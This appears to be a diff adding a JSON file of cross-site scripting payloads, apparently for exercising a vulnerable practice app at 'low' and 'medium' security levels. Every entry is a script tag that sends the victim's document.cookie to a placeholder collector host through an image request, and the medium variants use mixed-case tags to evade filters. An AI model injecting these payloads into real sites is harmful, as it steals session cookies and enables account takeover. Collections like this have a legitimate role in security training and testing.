@@ -1,0 +1,10 @@
+{
+    "low": [
+        "<script>new Image().src = '$URL/cookie?query=' + document.cookie</script>",
+        "<script>new Image().src = '$URL/cookie?query=' %2B document.cookie</script>"
+    ],
+    "medium": [
+        "<sCrIpT>new Image().src = '$URL/cookie?query=' + document.cookie</sCrIpT>",
+        "<sCrIpT>new Image().src = '$URL/cookie?query=' %2B document.cookie</sCrIpT>"
+    ]
+}
